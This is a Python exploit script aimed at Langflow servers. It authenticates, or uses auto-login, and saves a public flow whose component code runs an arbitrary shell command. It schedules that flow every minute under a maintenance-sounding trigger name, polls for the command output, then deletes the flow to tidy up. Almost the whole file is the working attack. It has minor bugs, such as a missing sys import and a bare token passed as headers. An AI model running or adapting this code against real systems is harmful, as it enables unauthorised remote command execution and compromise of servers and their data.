import uuid
from time import sleep
from argparse import ArgumentParser
from requests import get, post, delete

TIMEOUT = 15

def detect_version(base_url: str):
    endpoint = '/api/v1/version'

    try:
        resp = get(base_url + endpoint)
    except Exception as e:
        print(str(e))
        return

    print(f'[+] Langflow version: {resp.json()}')


def auto_login(base_url: str) -> str | None:
    endpoint = '/api/v1/auto_login'
    headers = {'Content-Type': 'application/json'}

    try:
        resp = get(base_url + endpoint, headers=headers)
    except Exception as e:
        raise RuntimeError(f"Error querying API.\n{str(e)}")

    if resp.status_code == 200:
        resp_json = resp.json()
        return resp_json['access_token']

    return


def authenticate(base_url: str, username: str, password: str) -> dict:
    endpoint = '/api/v1/login'

    try:
        resp = post(base_url + endpoint,
                    data={"username": username, "password": password},
                    timeout=TIMEOUT
                    )
        resp_json = resp.json()
    except Exception as e:
        raise RuntimeError(f"Unable to authenticate with Langflow: {str(e)}")

    if resp.status_code != 200 or not resp_json.get('access_token'):
        print(f"[!] Login failed: HTTP {resp.status_code} - {resp.text}")
        sys.exit(1)

    return {"Authorization": f"Bearer {resp_json['access_token']}"}


def create_flow(base_url: str, auth: dict, command: str) -> str:
    node_id = "Node"
    endpoint = '/api/v1/flows/'
    CODE = (
        "import subprocess as _sp\n"
        "_out = _sp.check_output(" + repr(command) + ", shell=True, "
        "stderr=_sp.STDOUT).decode(errors='replace').strip()\n"
        "from langflow.custom import Component\n"
        "from langflow.io import Output\n"
        "from langflow.schema import Data\n"
        "class Comp(Component):\n"
        '    display_name="Comp"\n'
        '    outputs=[Output(display_name="O",name="o",method="r")]\n'
        "    def r(self)->Data:\n"
        "        return Data(data={'output':_out})\n"
        "raise ValueError(f'Comp: {_out}')\n"
    )
    flow = {
        "name": f"{uuid.uuid4().hex[:6]}",
        "description": "test",
        "flow_type": "agent",
        "a2a_enabled": True,
        "access_type": "PUBLIC",
        "data": {
            "nodes": [{
                "id": node_id, "type": "genericNode", "position": {"x": 0, "y": 0},
                "data": {
                    "id": node_id,
                    "type": "",
                    "node": {
                        "template": {
                            "_type": "Component",
                            "code": {"type": "code", "required": True, "show": True,
                                     "multiline": True, "value": CODE,
                                     "name": "code", "password": False,
                                     "advanced": False, "dynamic": False}
                        },
                        "description": "Comp", "base_classes": ["Data"],
                        "display_name": "Comp", "name": "Comp",
                        "frozen": False,
                        "outputs": [{"types": ["Data"], "selected": "Data", "name": "o",
                                     "display_name": "O", "method": "r",
                                     "value": "__UNDEFINED__", "cache": True,
                                     "allows_loop": False, "tool_mode": False,
                                     "hidden": None, "required_inputs": None,
                                     "group_outputs": False}],
                        "field_order": ["code"], "beta": False, "edited": False,
                    }
                }
            }],
            "edges": [],
        },
    }
    try:
        resp = post(base_url + endpoint,
                 json=flow,
                 headers=auth,
                 timeout=TIMEOUT
                 )
        resp_json = resp.json()
    except Exception as e:
        raise RuntimeError(f"Unable to create flow: {str(e)}")

    if resp.status_code not in (200, 201) or not resp_json.get('id'):
        print(f"[!] Flow creation failed: HTTP {resp.status_code} - {resp.text}")
        sys.exit(1)

    return resp_json["id"]


def trigger(base_url: str, auth: dict, flow_id: str):
    endpoint = '/api/v1/triggers'
    data = {
        "flow_id": flow_id,
        "name": "Hourly Maintenance Schedule",
        "kind": "schedule",
        "config": {
            "cron": "* * * * *",
            "timezone": "UTC"
        },
        "state": "active",
        "concurrency_limit": 1,
        "max_attempts": 3
    }
    print(f'[*] Querying {base_url + endpoint}')
    try:
        resp = post(base_url + endpoint,
                    headers=auth,
                    json=data,
                    timeout=TIMEOUT
                    )
    except Exception as e:
        print(str(e))
        return

    return resp


def delete_flow(base_url, auth, flow_id):
    try:
        delete(f"{base_url}/api/v1/flows/{flow_id}", headers=auth, timeout=TIMEOUT)
    except Exception as e:
        print(str(e))
    print(f"\n[*] Flow {flow_id} deleted.")


def trigger_status(base_url: str, auth: dict, flow_id: str):
    endpoint = f'/api/v1/triggers?flow_id={flow_id}'

    while True:
        try:
            resp = get(base_url + endpoint,
                       headers=auth
                       )
            print(f'Status: {resp.status_code}\n{resp.json()}')
            sleep(10)
        except Exception as e:
            print(str(e))
            return



def main():
    parser = ArgumentParser(description="")
    parser.add_argument('--url', required=True, help="Target URL, e.g. http://192.168.1.30:7860")
    parser.add_argument('--username', required=True, help="Langflow username (to save the flow)")
    parser.add_argument('--password', required=True, help="Langflow password")
    parser.add_argument('--command', required=True, help="")
    args = parser.parse_args()

    # Determine Langflow version.
    detect_version(base_url=args.url)
    
    # Auth required only to save the malicious flow.
    print('[+] Authenticate with Langflow')
    auth = auto_login(base_url=args.url)
    if auth is None:
        auth = authenticate(base_url=args.url, username=args.username, password=args.password)


    print('[+] Creating flow.')
    flow_id = create_flow(base_url=args.url, auth=auth, command=args.command)

    try:
        print('[+] Trigger.')
        resp = trigger(base_url=args.url, auth=auth, flow_id=flow_id)
        print(f'[+] Status Code: {resp.status_code}\n\n Response:{resp.json()}')

        # Checking status
        print('[+] Checking trigger status.')
        trigger_status(base_url=args.url, auth=auth, flow_id=flow_id)
    finally:
        print('Deleting flow.')
        delete_flow(base_url=args.url, auth=auth, flow_id=flow_id)


main()
